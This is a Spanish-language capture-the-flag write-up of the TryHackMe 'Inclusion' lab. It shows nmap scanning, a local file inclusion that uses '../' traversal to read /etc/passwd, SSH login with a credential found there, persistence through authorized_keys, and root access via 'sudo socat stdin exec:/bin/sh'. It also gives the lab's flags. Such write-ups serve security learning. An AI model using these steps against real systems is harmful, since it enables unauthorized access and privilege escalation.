# Inclusion

`Try Hack Me` `Linux` `LFI` `SSH` `sudo` `socat`

## Flags

* **User Flag:** `60989655118397345799`
* **Root Flag:** `42964104845495153909`

## Users

* falconfeast _\(pwd: `rootpassword`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

![](https://i.imgur.com/442oKSr.png)

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 22 \(SSH\) y 80 \(HTTP\)

![](https://i.imgur.com/Kaxg51I.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

![](https://i.imgur.com/ofB1VGP.png)

### Servicio HTTP

Vemos ya que es un servidor HTTP en Python. Lanzamos un whatweb para ver si nos da más info: `whatweb IP`

![](https://i.imgur.com/H2NetYE.png)

De nuevo vemos lo mismo. Nos llama la atención lo de **`Werkzeug`**. Buscamos exploits sobre eso:

Encontramos un [exploit](https://www.exploit-db.com/exploits/43905) pero no existe el path **`/console`** en la web. Accedemos al portal web:

![](https://i.imgur.com/bJlojIx.png)

### LFI

Sabemos que la maquina va sobre un LFI. La web explica vulnerabilidades web, entre ellos, el LFI.

La casualidad, que el path **`IP/article?name=`** tiene una LFI, poniendo **`IP/article?name=FILE`** cargamos lo que sea. El RFI parece que no se lo traga

![](https://i.imgur.com/ZBto4Fl.png)

Podemos hacer directory path traversal con **`../../../../../etc/passwd`**

![](https://i.imgur.com/UW2kwl9.png)

En el **`/etc/passwd`** vemos un usuario **`falconfeast`** comentado con un password **`rootpassword`**

{% hint style="warning" %}
Tenemos un usuario **`falconfeast`** y su password **`rootpassword`**
{% endhint %}

## **Getting a shell**

Tenemos ya un usuario/password, por lo que conectamos por SSH:

![](https://i.imgur.com/6MG7rQg.png)

{% hint style="danger" %}
Podemos tener acceso sin contraseña copiando nuestra Clave Pública SSH

```bash
#ON MACHINE
cd
mkdir -p ~/.ssh
echo "[MY LOCAL ~/.ssh/id_rsa.pub]" >> ~/.ssh/authorized_keys

#ON KALI
ssh -i ~/.ssh/id_rsa USER@IP
```
{% endhint %}

### **User Flag**

En el directorio de falconfeast vemos la **user.txt** flag.

{% hint style="success" %}
USER FLAG: **`60989655118397345799`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario falconfeast con el comando `sudo -l`.

![](https://i.imgur.com/KdojLCX.png)

Vemos que puede ejecutar el comando **`socat`** sin password. Se puede explotar:

{% embed url="https://gtfobins.github.io/gtfobins/socat/\#sudo" caption="" %}

![](https://i.imgur.com/7Ksnalv.png)

Introducimos lo siguiente:

```text
sudo socat stdin exec:/bin/sh
```

![](https://i.imgur.com/65H38MF.png)

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la **root.txt** flag.

{% hint style="success" %}
ROOT FLAG: **`42964104845495153909`**
{% endhint %}

